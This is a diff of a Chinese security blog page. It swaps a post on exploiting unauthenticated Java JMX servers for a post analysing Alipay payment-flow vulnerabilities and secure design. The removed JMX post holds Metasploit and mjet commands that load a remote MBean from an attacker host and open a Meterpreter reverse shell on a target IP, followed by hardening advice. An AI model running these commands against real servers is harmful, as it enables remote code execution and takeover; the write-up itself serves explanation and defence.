@@ -4,27 +4,30 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>Java JMX Server 代码执行漏洞利用及防御 | xd_xd&#39;s blog</title>
+    <title>支付漏洞总结 | xd_xd&#39;s blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="xd_xd">
     
 
     
-    <meta name="description" content="#jmx基本概念官方说法：JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用通常用来监控jvm会使用这个服务。对外开放一个端口提供服务。使用官方jconsole连上可以查看jvm应用的各种信息。Java Ma">
+    <meta name="description" content="前言大家对支付漏洞的理解通常都是篡改价格，已有的对支付漏洞的总结也是对现有的一些案例的经验式归类，没有上升到对在线支付流程深入分析的一个层面。这里尝试从分析在线支付流程，在线支付厂商的接入方式开始，深入业务分析整个在线交易流程中容易出现的安全问题。
+支付宝/在线支付流程支付宝即时到账接口开发流程
+在线支付从功能上来说是通过支付宝的支付渠道，付款者直接汇款给另一个拥有支付宝账号的收款者。整个流程说明">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java JMX Server 代码执行漏洞利用及防御">
-<meta property="og:url" content="http://stayliv3.github.io/2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/index.html">
+<meta property="og:title" content="支付漏洞总结">
+<meta property="og:url" content="http://stayliv3.github.io/2015/12/02/支付漏洞总结/index.html">
 <meta property="og:site_name" content="xd_xd's blog">
-<meta property="og:description" content="#jmx基本概念官方说法：JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用通常用来监控jvm会使用这个服务。对外开放一个端口提供服务。使用官方jconsole连上可以查看jvm应用的各种信息。Java Ma">
-<meta property="og:image" content="http://stayliv3.github.io/images/jmx4.png">
-<meta property="og:image" content="http://stayliv3.github.io/images/jmx1.png">
-<meta property="og:image" content="http://stayliv3.github.io/images/jmx2.png">
-<meta property="og:image" content="http://stayliv3.github.io/images/jmx3.png">
-<meta property="og:updated_time" content="2015-11-24T03:27:38.000Z">
+<meta property="og:description" content="前言大家对支付漏洞的理解通常都是篡改价格，已有的对支付漏洞的总结也是对现有的一些案例的经验式归类，没有上升到对在线支付流程深入分析的一个层面。这里尝试从分析在线支付流程，在线支付厂商的接入方式开始，深入业务分析整个在线交易流程中容易出现的安全问题。
+支付宝/在线支付流程支付宝即时到账接口开发流程
+在线支付从功能上来说是通过支付宝的支付渠道，付款者直接汇款给另一个拥有支付宝账号的收款者。整个流程说明">
+<meta property="og:image" content="http://stayliv3.github.io/images/zaixianzhifu1.png">
+<meta property="og:updated_time" content="2015-12-03T01:52:02.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Java JMX Server 代码执行漏洞利用及防御">
-<meta name="twitter:description" content="#jmx基本概念官方说法：JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用通常用来监控jvm会使用这个服务。对外开放一个端口提供服务。使用官方jconsole连上可以查看jvm应用的各种信息。Java Ma">
+<meta name="twitter:title" content="支付漏洞总结">
+<meta name="twitter:description" content="前言大家对支付漏洞的理解通常都是篡改价格，已有的对支付漏洞的总结也是对现有的一些案例的经验式归类，没有上升到对在线支付流程深入分析的一个层面。这里尝试从分析在线支付流程，在线支付厂商的接入方式开始，深入业务分析整个在线交易流程中容易出现的安全问题。
+支付宝/在线支付流程支付宝即时到账接口开发流程
+在线支付从功能上来说是通过支付宝的支付渠道，付款者直接汇款给另一个拥有支付宝账号的收款者。整个流程说明">
 
     
     <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
@@ -84,14 +87,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/" title="Java JMX Server 代码执行漏洞利用及防御" itemprop="url">Java JMX Server 代码执行漏洞利用及防御</a>
+      <a href="/2015/12/02/支付漏洞总结/" title="支付漏洞总结" itemprop="url">支付漏洞总结</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="xd_xd" target="_blank" itemprop="author">xd_xd</a>
 		
   <p class="article-time">
-    <time datetime="2015-10-27T07:03:44.000Z" itemprop="datePublished"> 发表于 Oct 27 2015</time>
+    <time datetime="2015-12-02T05:47:07.000Z" itemprop="datePublished"> 发表于 Dec 2 2015</time>
     
   </p>
 </header>
@@ -100,59 +103,33 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#支付宝/在线支付流程"><span class="toc-number">2.</span> <span class="toc-text">支付宝/在线支付流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#业务思考"><span class="toc-number">3.</span> <span class="toc-text">业务思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#风险分析"><span class="toc-number">4.</span> <span class="toc-text">风险分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安全的设计方案："><span class="toc-number">5.</span> <span class="toc-text">安全的设计方案：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">6.</span> <span class="toc-text">参考资料</span></a></li></ol>
 		
 		</div>
 		
-		<p>#jmx基本概念<br>官方说法：<br>JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用<br>通常用来监控jvm会使用这个服务。对外开放一个端口提供服务。使用官方jconsole连上可以查看jvm应用的各种信息。<br><img src="/images/jmx4.png" alt=""><br><a href="http://www.oracle.com/technetwork/articles/java/javamanagement-140525.html" target="_blank" rel="external">Java Management Extensions (JMX) Technology</a></p>
-<p>#不安全配置</p>
-<p>来自oracle官方文档：</p>
-<pre><code>Disabling Security
-To disable both password authentication and SSL (namely to disable all security), you should <span class="operator"><span class="keyword">set</span> the <span class="keyword">following</span> <span class="keyword">system</span> properties <span class="keyword">when</span> you <span class="keyword">start</span> the <span class="keyword">Java</span> VM.
-
-com.sun.<span class="keyword">management</span>.jmxremote.authenticate=<span class="literal">false</span>
-com.sun.<span class="keyword">management</span>.jmxremote.ssl=<span class="literal">false</span>
-
-Caution - This configuration <span class="keyword">is</span> insecure: <span class="keyword">any</span> remote <span class="keyword">user</span> who knows (<span class="keyword">or</span> guesses) your port <span class="built_in">number</span> <span class="keyword">and</span> host <span class="keyword">name</span> will be able <span class="keyword">to</span> monitor <span class="keyword">and</span> control your <span class="keyword">Java</span> applications <span class="keyword">and</span> platform. Furthermore, possible harm <span class="keyword">is</span> <span class="keyword">not</span> limited <span class="keyword">to</span> the <span class="keyword">operations</span> you <span class="keyword">define</span> <span class="keyword">in</span> your MBeans. A remote <span class="keyword">client</span> could <span class="keyword">create</span> a javax.<span class="keyword">management</span>.loading.MLet MBean <span class="keyword">and</span> <span class="keyword">use</span> it <span class="keyword">to</span> <span class="keyword">create</span> <span class="keyword">new</span> MBeans <span class="keyword">from</span> arbitrary URLs, <span class="keyword">at</span> <span class="keyword">least</span> <span class="keyword">if</span> there <span class="keyword">is</span> <span class="keyword">no</span> <span class="keyword">security</span> manager. <span class="keyword">In</span> other words, a rogue remote <span class="keyword">client</span> could make your <span class="keyword">Java</span> application <span class="keyword">execute</span> arbitrary code.
-
-Consequently, <span class="keyword">while</span> disabling <span class="keyword">security</span> might be acceptable <span class="keyword">for</span> development, it <span class="keyword">is</span> strongly recommended that you <span class="keyword">do</span> <span class="keyword">not</span> <span class="keyword">disable</span> <span class="keyword">security</span> <span class="keyword">for</span> production systems.</span>
-</code></pre><p>当禁用代码执行的时候存在任意代码执行问题。<br><a href="https://www.exploit-db.com/exploits/36101/" target="_blank" rel="external">metaploit</a>模块描述如下：</p>
-<pre><code>This module takes advantage <span class="tag">a</span> Java JMX interface insecure configuration, which would allow loading classes from any remote (HTTP) URL. JMX interfaces with authentication disabled (com<span class="class">.sun</span><span class="class">.management</span><span class="class">.jmxremote</span><span class="class">.authenticate</span>=false) should be vulnerable, while interfaces with authentication enabled will be vulnerable only <span class="keyword">if</span> <span class="tag">a</span> weak configuration is deployed (allowing to use javax<span class="class">.management</span><span class="class">.loading</span><span class="class">.MLet</span>, having <span class="tag">a</span> security manager allowing to load <span class="tag">a</span> ClassLoader MBean, etc
-</code></pre><p>当开启了密码认证的时候还需要其他限制条件才可以利用。</p>
-<p>#漏洞利用程序<br>漏洞利用程序可以使用<a href="https://github.com/mogwaisec/mjet" target="_blank" rel="external">mjet</a>。过程参考<a href="http://www.n0tr00t.com/2015/04/17/JMX-RMI-Exploit-Demo.html" target="_blank" rel="external">JMX RMI Exploit Demo</a></p>
-<p>#测试记录<br>安装mjet</p>
-<pre><code>git clone  https://github.com/mogwaisec/mjet
-
-<span class="built_in">Copy</span> <span class="bash">the <span class="string">"MBean"</span> folder to <span class="string">"data/java/metasploit"</span>
-</span><span class="built_in">Copy</span> <span class="bash">java_mlet_server.rb to <span class="string">"modules/exploits/multi/misc/"</span></span>
-</code></pre><p>在kali 1.1.0中metasploit路径为/opt/metasploit/apps/pro/msf3</p>
-<p>启动metasploit：</p>
-<pre><code>msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; use exploit/multi/misc/java_mlet_server 
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set payload java/meterpreter/reverse_tcp 
-payload =&gt; java/meterpreter/reverse_tcp
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set LHOST <span class="number">13.7</span>.<span class="number">8.53</span>
-LHOST =&gt; <span class="number">13.7</span>.<span class="number">8.53</span>
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set LPORT <span class="number">29999</span>
-LPORT =&gt; <span class="number">29999</span>
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; run
-[*] Exploit running as <span class="attribute">background</span> job.
-[*] Started reverse handler on <span class="number">13.7</span>.<span class="number">8.53</span>:<span class="number">29999</span> 
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; [*] Using URL: http:<span class="comment">//0.0.0.0:8080/2B7JthqVZW</span>
-[*]  Local IP: http:<span class="comment">//13.7.8.53:8080/2B7JthqVZW</span>
-[*] Server started.
-</code></pre><p><img src="/images/jmx1.png" alt=""><br>或得payload url，作为u参数。</p>
-<pre><code>java -jar mjet/mjet<span class="class">.jar</span> -<span class="tag">p</span> <span class="number">9090</span> -u http:<span class="comment">//13.7.8.53:8080/2B7JthqVZW -t 42.91.1.1</span>
-</code></pre><p><img src="/images/jmx2.png" alt=""><br>msf获得权限<br><img src="/images/jmx3.png" alt=""></p>
-<p>图片来自<a href="http://www.ricter.me/posts/JMX%20RMI%20Exploit%20%E5%AE%9E%E4%BE%8B?_=1445856355931" target="_blank" rel="external">JMX RMI Exploit 实例</a></p>
-<p>#测试失败记录<br>测试的时候发现如果不使用msf，自己架web服务提供恶意Mbean，jar包一定要配置对，如果配置错误的话，除非对方服务重启，不然每次都是加载第一次错误的包导致利用失败。</p>
-<p>#启用安全的配置<br>    So it’s important to keep in mind that setting java.rmi.server.hostname has no effect on whether or not this is an insecure configuration.  If you actually want to secure your JMX RMI port, you have many options, such as (in decreasing order of preference):</p>
-<pre><code>Don’t pass com.sun.management.jmxremote.port. This will <span class="operator"><span class="keyword">start</span> a <span class="keyword">local</span>-<span class="keyword">only</span> JMX <span class="keyword">server</span>, <span class="keyword">and</span> you can <span class="keyword">get</span> the <span class="keyword">connection</span> address <span class="keyword">from</span> com.sun.<span class="keyword">management</span>.jmxremote.localConnectorAddress  <span class="keyword">http</span>://docs.<span class="keyword">oracle</span>.com/javase/<span class="number">6</span>/docs/technotes/guides/<span class="keyword">management</span>/<span class="keyword">agent</span>.html
-<span class="keyword">Enable</span> SSL <span class="keyword">client</span> certificate <span class="keyword">authentication</span>
-<span class="keyword">Enable</span> <span class="keyword">password</span> <span class="keyword">authentication</span> <span class="keyword">and</span> <span class="keyword">use</span> SSL
-Firewall your JMX RMI port
-+ See more <span class="keyword">at</span>: <span class="keyword">http</span>://www.accuvant.com/blog/exploiting-jmx-rmi#sthash.AsAasfPW.dpuf</span>
-</code></pre><p>除了启用密码认证和SSL，还可以配置防火墙。文中还提到了不要指定端口，以及设置java.rmi.server.hostname是不安全的配置，这个点没有具体测试。</p>
-<p>#参考资料<br><a href="http://www.accuvant.com/blog/exploiting-jmx-rmi" target="_blank" rel="external">Exploiting JMX RMI</a><br><a href="http://docs.oracle.com/javase/6/docs/technotes/guides/management/agent.html" target="_blank" rel="external">jmx配置官方文档</a></p>
+		<h2 id="前言">前言</h2><p>大家对支付漏洞的理解通常都是篡改价格，已有的对支付漏洞的总结也是对现有的一些案例的经验式归类，没有上升到对在线支付流程深入分析的一个层面。这里尝试从分析在线支付流程，在线支付厂商的接入方式开始，深入业务分析整个在线交易流程中容易出现的安全问题。</p>
+<h2 id="支付宝/在线支付流程">支付宝/在线支付流程</h2><p><a href="https://cshall.alipay.com/support/help_detail.htm?help_id=476935" target="_blank" rel="external">支付宝即时到账接口开发流程</a></p>
+<p>在线支付从功能上来说是通过支付宝的支付渠道，付款者直接汇款给另一个拥有支付宝账号的收款者。整个流程说明如下：引用自支付宝文档。<br><img src="/images/zaixianzhifu1.png" alt=""></p>
+<pre><code>(<span class="number">1</span>)构造请求数据
+商户根据支付宝提供的接口规则，通过程序生成得到签名结果及要传输给支付宝的数据集合。
+(<span class="number">2</span>)发送请求数据
+把构造完成的数据集合，通过页面链接跳转或表单提交的方式传递给支付宝。
+(<span class="number">3</span>)支付宝对请求数据进行处理
+支付宝得到这些集合后，会先进行安全校验等验证，一系列验证通过后便会处理这次发送过来的数据请求。
+(<span class="number">4</span>)返回处理的结果数据
+对于处理完成的交易，支付宝会以两种方式把数据反馈给商户网站。
+程序上自动进行重新构造URL地址链接，在用户当前页面上通过自动跳转的方式跳回商户在请求时设定好的页面路径地址（参数return_url，如果商户没有设定，则不会进行该操作）
+支付宝服务器主动发起通知，调用商户在请求时设定好的页面路径（参数notify_url，如果商户没有设定，则不会进行该操作）。
+(<span class="number">5</span>)对获取的返回结果数据进行处理
+商户在同步通知处理页面（参数return_url指定页面文件）或服务器异步通知页面（参数notify_url指定页面文件）获取支付宝返回的结果数据后，可以结合自身网站的业务逻辑进行数据处理（如：订单更新、自动充值到会员账号中等）。
+</code></pre><h2 id="业务思考">业务思考</h2><p>通过这个流程可以知道。应用端做的两个重要步骤，一个是拼接支付的请求，返回给用户浏览器，用户浏览器请求支付宝接口，进入支付流程，整个支付的环节是和支付宝端交互，支付完成之后，支付宝通过通知接口给应用发送支付成功的通知。应用通过支付宝的通知信息来判断支付是否成功。</p>
+<h2 id="风险分析">风险分析</h2><p>首先第二步，发送请求数据。这一步虽然是在用户的浏览器端完成的。但是支付接口都有强制的签名来保证完整性，所以这里数据是无法篡改的，在签名key不泄露的情况下。所以通常见到的支付漏洞都是第一步，应用构造请求数据的时候出现的缺陷。</p>
+<p>对于交易这一业务功能来讲，应用只需要用户提供商品id和商品数量就可以满足支付所需要的所有数据了。这个地方容易出现的问题主要有以下几种：</p>
+<p>1，直接把订单的总金额从客户端获取，放在了构造的请求交易数据中。<br>2，虽然只传递商品id和数量，但是数量没有做白名单限制，造成可以输入负数或者大数造成计算溢出，导致最终计算的订单金额出现错误。<br>3，除了商品数量和商品id，还有其他参与订单金额计算的参数从客户端获取，比如运费等</p>
+<p>第三步和第四步是支付宝进行的处理，所以也不存在问题。第五步，支付宝通知应用用户付款成功，这里支付宝设计了notify_id供应用来验证通知信息是否是有效的。但是一般很少见人用，因为这一步数据也是有签名的。只要应用对支付宝的通知信息进行签名验证就可以。但是这个验证是应用自己来控制的，并不像第二步是支付宝控制的进行签名验证，所以一旦应用没有对支付宝通知信息进行签名验证就会导致伪造支付宝的通知信息，欺骗应用支付成功的漏洞。这种类型的问题看到的案例比较少。比如<a href="http://wooyun.org/bugs/wooyun-2010-0146510" target="_blank" rel="external">我是如何1元再购特斯拉的</a>。这种类型的问题应该也比较常见，可能是对这个逻辑的测试还不够关注。</p>
+<p>所以通过分析整个在线支付的流程可以看到，容易出现支付漏洞的有两个点，一个是构造支付请求的阶段，一个是对返回的结果数据进行处理的阶段。这里分析的是一个典型的支付流程，此外还有一些比较复杂的交易设计，比如设计了可以修改订单的功能等，随着功能的增加也会引入一些安全问题。</p>
+<h2 id="安全的设计方案：">安全的设计方案：</h2><p>只从客户端获取商品id和数量，对数量范围进行限制。对接受支付宝通知的接口对通知信息进行签名验证，对支付金额和订单金额进行对比以及验证支付订单号避免重放攻击。只要考虑到这几个问题，就可以设计一个比较安全的支付流程。</p>
+<h2 id="参考资料">参考资料</h2><p><a href="http://drops.wooyun.org/papers/345" target="_blank" rel="external">乌云drops</a></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -166,7 +143,7 @@ Firewall your JMX RMI port
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/java/">java</a>
+  <span></span> <a href="/tags/支付漏洞/">支付漏洞</a>
   </div>
 
 </div>
@@ -175,7 +152,7 @@ Firewall your JMX RMI port
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://stayliv3.github.io/2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/" data-title="Java JMX Server 代码执行漏洞利用及防御 | xd_xd&#39;s blog" data-tsina="null" class="share clearfix">
+	  <div data-url="http://stayliv3.github.io/2015/12/02/支付漏洞总结/" data-title="支付漏洞总结 | xd_xd&#39;s blog" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -189,18 +166,18 @@ Firewall your JMX RMI port
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2015/11/03/几个DOM-XSS案例分析/" title="几个DOM XSS案例分析">
+ <a href="/2015/12/03/php比较操作符的安全问题/" title="php比较操作符的安全问题">
   <strong>上一篇：</strong><br/>
   <span>
-  几个DOM XSS案例分析</span>
+  php比较操作符的安全问题</span>
 </a>
 </div>
 
 
 <div class="next">
-<a href="/2015/10/22/YII应用一个SQL注入分析/"  title="Yii应用一个SQL注入分析">
+<a href="/2015/11/30/绿麻雀网贷系统安全审计/"  title="绿麻雀网贷系统安全审计">
  <strong>下一篇：</strong><br/> 
- <span>Yii应用一个SQL注入分析
+ <span>绿麻雀网贷系统安全审计
 </span>
 </a>
 </div>
@@ -209,7 +186,7 @@ Firewall your JMX RMI port
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/" data-title="Java JMX Server 代码执行漏洞利用及防御" data-url="http://stayliv3.github.io/2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/"></div>
+	<div class="ds-thread" data-thread-key="2015/12/02/支付漏洞总结/" data-title="支付漏洞总结" data-url="http://stayliv3.github.io/2015/12/02/支付漏洞总结/"></div>
 </section>
 
 
@@ -219,7 +196,7 @@ Firewall your JMX RMI port
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#支付宝/在线支付流程"><span class="toc-number">2.</span> <span class="toc-text">支付宝/在线支付流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#业务思考"><span class="toc-number">3.</span> <span class="toc-text">业务思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#风险分析"><span class="toc-number">4.</span> <span class="toc-text">风险分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安全的设计方案："><span class="toc-number">5.</span> <span class="toc-text">安全的设计方案：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">6.</span> <span class="toc-text">参考资料</span></a></li></ol>
  
   </div>
 
